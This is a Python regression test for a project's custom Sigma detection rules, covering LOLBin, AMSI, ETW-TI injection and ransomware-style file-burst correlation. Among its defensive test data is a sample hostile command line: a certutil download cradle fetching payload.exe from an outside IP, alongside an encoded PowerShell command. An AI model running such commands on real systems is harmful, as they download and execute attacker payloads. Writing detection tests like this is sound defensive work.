"""Regression test for the phase-2/3 standardization: this project's own
Sigma rules under sigma_rules_custom/ (LOLBin + AMSI single-event rules, and
the Mass File Modification event_count correlation rule) load and fire.

Loads ONLY sigma_rules_custom (not the ~2000-rule vendored set) so it's fast;
the custom correlation's base rule lives in the same dir, so references
resolve. Run directly:

    .venv/Scripts/python.exe tests/test_sigma_correlation.py
"""

import sys
from datetime import datetime, timedelta
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from orchestrator.sigma_engine import SigmaEngine  # noqa: E402

CUSTOM = PROJECT_ROOT / "sigma_rules_custom"
LOLBIN_ID = "c0f1a2b3-1111-4a00-9c01-5a0dbea50b01"
AMSI_ID = "c0f1a2b3-2222-4a00-9c02-5a0dbea50b02"
CORR_ID = "c0f1a2b3-3333-4a00-9c03-5a0dbea50b03"
ETWTI_ID = "c0f1a2b3-4444-4a00-9c04-5a0dbea50b04"


def _fired(alerts, rule_id):
    return [a for a in alerts if a.get("sigma", {}).get("id") == rule_id]


def _file_events(pid, n, start, step_seconds):
    evs = []
    for i in range(n):
        ts = (start + timedelta(seconds=i * step_seconds)).isoformat() + "Z"
        evs.append(
            {
                "event_type": "FileCreate",
                "event_id": 11,
                "source": "sysmon",
                "timestamp": ts,
                "data": {"ProcessId": str(pid), "TargetFilename": f"C:\\x\\f{i}.txt", "Image": "ransom.exe"},
            }
        )
    return evs


def main() -> None:
    e = SigmaEngine(CUSTOM, min_level="medium")
    assert not e.load_errors, e.load_errors

    # --- Phase 2: single-event custom rules ---
    lolbin = {"event_type": "ProcessCreate", "event_id": 1, "source": "sysmon", "data": {"CommandLine": "powershell -enc ZQB2AA=="}}
    benign = {"event_type": "ProcessCreate", "event_id": 1, "source": "sysmon", "data": {"CommandLine": "notepad.exe a.txt"}}
    # certutil download cradle -- a DIFFERENT regex branch than the powershell
    # one. Covered here at the rule level because in the real Defender-on
    # sandbox certutil is killed before Sysmon logs its ProcessCreate, so the
    # lolbin_certutil_download detection-quality scenario can't exercise this
    # branch (it asserts the DefenderThreatDetected path instead).
    certutil = {"event_type": "ProcessCreate", "event_id": 1, "source": "sysmon",
                "data": {"CommandLine": r"certutil.exe -urlcache -split -f http://185.1.2.3/payload.exe C:\Users\u\a.exe"}}
    assert len(_fired(e.evaluate([lolbin]), LOLBIN_ID)) == 1, "LOLBin rule should fire"
    assert len(_fired(e.evaluate([certutil]), LOLBIN_ID)) == 1, "LOLBin rule should fire on certutil download cradle"
    assert not _fired(e.evaluate([benign]), LOLBIN_ID), "LOLBin rule must not fire on benign command"
    print("PASS: LOLBin custom Sigma rule fires on LOLBin command line only (powershell + certutil branches)")

    amsi_det = {"event_type": "AmsiScanDetected", "event_id": 0, "source": "amsi", "data": {"ScanResult": "32768"}}
    amsi_clean = {"event_type": "AmsiScanDetected", "event_id": 0, "source": "amsi", "data": {"ScanResult": "1"}}
    assert len(_fired(e.evaluate([amsi_det]), AMSI_ID)) == 1, "AMSI rule should fire on detection"
    assert not _fired(e.evaluate([amsi_clean]), AMSI_ID), "AMSI rule must not fire on a clean scan"
    print("PASS: AMSI custom Sigma rule fires only on an actual detection (ScanResult >= 16384)")

    # --- ETW-TI cross-process injection rule (uses the |fieldref modifier) ---
    assert not e.unsupported_modifier_rule_ids, "fieldref is supported now -- no rule should be flagged unsupported"
    cross = {"source": "etw_ti", "event_type": "AllocVm", "event_id": 1, "data": {"CallingProcessId": "1000", "TargetProcessId": "2000"}}
    same = {"source": "etw_ti", "event_type": "AllocVm", "event_id": 1, "data": {"CallingProcessId": "1000", "TargetProcessId": "1000"}}
    no_target = {"source": "etw_ti", "event_type": "AllocVm", "event_id": 1, "data": {"CallingProcessId": "1000"}}
    assert len(_fired(e.evaluate([cross]), ETWTI_ID)) == 1, "should fire on a cross-process ETW-TI op"
    assert not _fired(e.evaluate([same]), ETWTI_ID), "|fieldref: same-process op must not fire"
    assert not _fired(e.evaluate([no_target]), ETWTI_ID), "no target process -> no fire"
    print("PASS: ETW-TI injection rule fires cross-process only (|fieldref TargetProcessId vs CallingProcessId)")

    # --- Phase 3: event_count correlation rule ---
    assert len(e._correlations) == 1 and e.correlation_rules_skipped == 0, "correlation rule should be loaded, not skipped"
    t0 = datetime(2026, 7, 3, 12, 0, 0)

    burst = _file_events(1000, 25, t0, 0.1)  # 25 file events in ~2.5s
    fired = _fired(e.evaluate(burst), CORR_ID)
    assert len(fired) == 1, "correlation should fire on 25 file events within 5s"
    assert fired[0]["data"]["matched_events"] == 25
    assert fired[0]["data"].get("ProcessId") == "1000", "group-by ProcessId should be surfaced in data"
    # base rule must not individually alert on every file event
    assert not [a for a in e.evaluate(burst) if a.get("sigma") and a["sigma"].get("id") != CORR_ID]
    print("PASS: correlation fires on a burst; base rule never alerts individually")

    assert not _fired(e.evaluate(_file_events(1000, 10, t0, 0.1)), CORR_ID), "10 events is below the >=20 threshold"
    assert not _fired(e.evaluate(_file_events(1000, 25, t0, 1.0)), CORR_ID), "25 events over 25s never reach 20 in any 5s window"
    print("PASS: correlation respects threshold and the sliding timespan window")

    two = _file_events(1000, 25, t0, 0.1) + _file_events(2000, 25, t0, 0.1)
    assert len(_fired(e.evaluate(two), CORR_ID)) == 2, "two bursting processes -> one correlation each (group-by)"
    split = _file_events(1000, 15, t0, 0.1) + _file_events(2000, 15, t0, 0.1)
    assert not _fired(e.evaluate(split), CORR_ID), "15+15 across two pids -> neither reaches 20 (per-process grouping)"
    print("PASS: correlation groups per process (group-by ProcessId)")

    print("\nALL SIGMA CORRELATION / CUSTOM-RULE TESTS PASSED")


if __name__ == "__main__":
    main()
